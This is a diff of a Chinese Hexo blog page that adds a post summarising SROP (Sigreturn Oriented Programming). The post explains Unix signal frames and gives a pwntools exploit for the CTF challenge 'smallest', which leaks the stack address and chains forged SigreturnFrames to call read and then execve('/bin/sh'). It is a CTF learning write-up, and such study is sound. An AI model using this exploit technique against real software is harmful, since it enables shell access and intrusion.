@@ -6,19 +6,23 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://yoursite.com">
-  <title>分类 | 辰祈w</title>
+  <title>srop的知识总结 | 辰祈w</title>
   <meta name="generator" content="hexo-theme-yilia-plus">
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
   
-  <meta property="og:type" content="website">
-<meta property="og:title" content="分类">
-<meta property="og:url" content="http://yoursite.com/categories/index.html">
+  <meta name="description" content="srop的知识总结SROP的全称是Sigreturn Oriented Programming。在这里sigreturn是一个系统调用，它在unix系统发生signal的时候会被间接地调用。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="srop的知识总结">
+<meta property="og:url" content="http://yoursite.com/2021/02/02/srop%E7%9A%84%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93/index.html">
 <meta property="og:site_name" content="辰祈w">
+<meta property="og:description" content="srop的知识总结SROP的全称是Sigreturn Oriented Programming。在这里sigreturn是一个系统调用，它在unix系统发生signal的时候会被间接地调用。">
 <meta property="og:locale" content="en_US">
-<meta property="article:published_time" content="2020-03-24T14:13:22.000Z">
-<meta property="article:modified_time" content="2020-03-24T14:15:51.089Z">
+<meta property="og:image" content="https://inews.gtimg.com/newsapp_ls/0/13123028527/0">
+<meta property="article:published_time" content="2021-02-02T08:16:16.232Z">
+<meta property="article:modified_time" content="2021-02-02T08:18:10.564Z">
 <meta property="article:author" content="Chenqiw">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://inews.gtimg.com/newsapp_ls/0/13123028527/0">
   
     <link rel="alternative" href="/atom.xml" title="辰祈w" type="application/atom+xml">
   
@@ -185,14 +189,14 @@
               class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            <article id="page-" class="article article-type-page " itemscope itemprop="blogPost">
+            <article id="post-srop的知识总结" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
   
   
     <h1 class="article-title" itemprop="name">
-      分类
+      srop的知识总结
     </h1>
   
 
@@ -204,8 +208,8 @@
               <i class="icon-smile icon"></i> 阅读数：<span id="busuanzi_value_page_pv"></span>次
         </span>
 
-<a href="/categories/index.html" class="archive-article-date">
-        <time datetime="2020-03-24T14:13:22.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-03-24</time>
+<a href="/2021/02/02/srop%E7%9A%84%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93/" class="archive-article-date">
+        <time datetime="2021-02-02T08:16:16.232Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-02-02</time>
 </a>
 
   
@@ -218,7 +222,7 @@
       <!-- 百度字体平台:http://fontstore.baidu.com/static/editor/index.html -->
       <i class="icon-statistics"></i>
       <span class="post-meta-item-text"> 字数统计:</span>
-      <span class="post-count">0字</span>
+      <span class="post-count">814字</span>
     </span>
   </span>
 
@@ -227,7 +231,7 @@
     <span class="post-meta-item-icon">
       <i class="icon-book icon"></i>
       <span class="post-meta-item-text"> 阅读时长≈</span>
-      <span class="post-count">1分</span>
+      <span class="post-count">3分</span>
     </span>
   </span>
 </div>
@@ -238,7 +242,34 @@
   
   <div class="article-entry" itemprop="articleBody">
     
-    
+    <h1 id="srop的知识总结"><a href="#srop的知识总结" class="headerlink" title="srop的知识总结"></a>srop的知识总结</h1><p>SROP的全称是Sigreturn Oriented Programming。在这里<code>sigreturn</code>是一个系统调用，它在unix系统发生signal的时候会被间接地调用。 </p>
+<a id="more"></a>
+
+<p>首先来了解一下<strong>Signal in Unix-like System</strong></p>
+<p>Signal这套机制在1970年代就被提出来并整合进了UNIX内核中，它在现在的操作系统中被使用的非常广泛，比如内核要杀死一个进程，再比如为进程设置定时器，或者通知进程一些异常事件等等。</p>
+<p>如下图所示，当内核向某个进程发起（deliver）一个signal，该进程会被暂时挂起（suspend），进入内核（1），然后内核为该进程保存相应的上下文，跳转到之前注册好的signal handler中处理相应signal（2），当signal handler返回之后（3），内核为该进程恢复之前保存的上下文，最后恢复进程的执行（4）。</p>
+<p><img src="https://inews.gtimg.com/newsapp_ls/0/13123028527/0" alt="image-20210202141535344"></p>
+<p>其中在第二步保存完进程上下文之后他会在栈顶上填上一个地址<code>rt_sigreturn</code>，这个地址指向一段代码，在这段代码中会调用<code>sigreturn</code>系统调用，那么在执行完signal Handler的时候，栈指针就会指向<code>rt_sigreturn</code>，然后就会进行<code>sigreturn</code>系统调用，于是我们将栈上保存的用户进程上下文、signal相关信息，以及<code>rt_sigreturn</code> 称为一个Signal Frame </p>
+<p>但是我们知道这个Signal Frame是保存在用户进程的地址空间里面，那么我们就可以对他进行改写，而且在恢复的时候即执行<code>sigreturn</code>系统调用的时候并没有一个检查机制去检查Signal Frame是不是之前保存的，这就说明我们可以自己伪造一个Signal Frame然后调用<code>sigreturn</code>系统调用，这样就可以让程序执行我们自己构造的代码</p>
+<p>32 位的 sigreturn 的系统调用号为 77，64 位的系统调用号为 15</p>
+<p>在这个攻击中，有4个前提条件：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">第一，攻击者可以通过stack overflow等漏洞控制栈上的内容；</span><br><span class="line">第二，需要知道栈的地址（比如需要知道自己构造的字符串&#96;&#x2F;bin&#x2F;sh&#96;的地址）；</span><br><span class="line">第三，需要知道&#96;syscall&#96;指令在内存中的地址；</span><br><span class="line">第四，需要知道&#96;sigreturn&#96;系统调用的内存地址。</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h3><p>ichunqiu360中的smallest </p>
+<p>第一步我们要知道栈地址</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">syscall_ret = <span class="number">0x00000000004000BE</span></span><br><span class="line">start_addr = <span class="number">0x00000000004000B0</span></span><br><span class="line">payload = p64(start_addr) * <span class="number">3</span></span><br><span class="line">p.send(payload)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">p.send(<span class="string">'\xb3'</span>)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">stack_addr = u64(p.recv()[<span class="number">8</span>:<span class="number">16</span>])</span><br></pre></td></tr></table></figure>
+
+<p>这里我们利用‘\xb3’来跳过rax置零 因为我们发送了一个字节，而read函数会把读入的字节数放到rax，write的系统调用号是1，所以之后会调用write，打印栈地址。</p>
+<p>第二步构造SigreturnFrame()，往我们知道的栈地址上面写东西，然后触发Sigreturn</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">read = SigreturnFrame()</span><br><span class="line">read.rax = constants.SYS_read</span><br><span class="line">read.rdi = <span class="number">0</span></span><br><span class="line">read.rsi = stack_addr</span><br><span class="line">read.rdx = <span class="number">0x400</span></span><br><span class="line">read.rsp = stack_addr</span><br><span class="line">read.rip = syscall_ret</span><br><span class="line"></span><br><span class="line">read_frame_payload  = p64(start_addr) + p64(syscall_ret) + str(read)</span><br><span class="line">p.send(read_frame_payload)<span class="comment">#</span></span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">p.send(read_frame_payload[<span class="number">8</span>:<span class="number">8</span>+<span class="number">15</span>])</span><br></pre></td></tr></table></figure>
+
+<p>第三步继续构造SigreturnFrame()，执行execve(/bin/sh)</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">execve = SigreturnFrame()</span><br><span class="line">execve.rax=constants.SYS_execve</span><br><span class="line">execve.rdi=stack_addr + <span class="number">0x120</span></span><br><span class="line">execve.rsi=<span class="number">0x0</span></span><br><span class="line">execve.rdx=<span class="number">0x0</span></span><br><span class="line">execve.rsp=stack_addr</span><br><span class="line">execve.rip=syscall_ret</span><br><span class="line">execv_frame_payload=p64(start_addr)+p64(syscall_ret)+str(execve)<span class="comment">#</span></span><br><span class="line"><span class="keyword">print</span> len(execv_frame_payload)</span><br><span class="line">execv_frame_payload_all=execv_frame_payload+(<span class="number">0x120</span>-len(execv_frame_payload ))*<span class="string">'\x00'</span>+<span class="string">'/bin/sh\x00'</span></span><br><span class="line"></span><br><span class="line">p.send(execv_frame_payload_all)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">p.send(execv_frame_payload_all[<span class="number">8</span>:<span class="number">8</span>+<span class="number">15</span>])</span><br></pre></td></tr></table></figure>
+
+<p>这就是最普通的srop</p>
+
     
 
     
@@ -252,7 +283,7 @@
         </li>
         <li>
           <strong>本文链接：</strong>
-          <a href="http://yoursite.com/categories/index.html" title="分类" target="_blank">http://yoursite.com/categories/index.html</a>
+          <a href="http://yoursite.com/2021/02/02/srop的知识总结/" title="srop的知识总结" target="_blank">http://yoursite.com/2021/02/02/srop的知识总结/</a>
         </li>
         
         <li>
@@ -319,7 +350,7 @@
     <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-     <!-- <img src="//pan.baidu.com/share/qrcode?url=http://yoursite.com/categories/" alt="微信分享二维码"> -->
+     <!-- <img src="//pan.baidu.com/share/qrcode?url=http://yoursite.com/2021/02/02/srop%E7%9A%84%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93/" alt="微信分享二维码"> -->
     </div>
 </div>
 
@@ -331,6 +362,16 @@
   </div>
 </article>
 
+
+<nav id="article-nav">
+  
+  
+    <a href="/2021/01/15/magic%20gadget/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">magic gadget</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
 
 
 <aside class="wrap-side-operation">
@@ -400,7 +441,7 @@
 	var yiliaConfig = {
 		mathjax: false,
 		isHome: false,
-		isPost: false,
+		isPost: true,
 		isArchive: false,
 		isTag: false,
 		isCategory: false,
